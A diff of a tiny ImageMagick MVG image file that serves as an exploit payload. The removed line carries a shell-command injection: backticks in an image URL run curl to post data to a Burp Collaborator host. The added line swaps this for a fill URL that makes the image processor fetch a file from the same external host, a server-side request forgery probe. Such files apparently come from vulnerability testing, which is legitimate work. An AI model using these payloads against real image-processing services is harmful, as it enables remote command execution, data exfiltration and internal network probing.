@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "https://2adferh4stynf8sc4b3o1vdrgimia7.burpcollaborator.net/lolol" -d @- > /dev/null`'
+fill 'url(https://2adferh4stynf8sc4b3o1vdrgimia7.burpcollaborator.net/test.jpg)'
 pop graphic-context
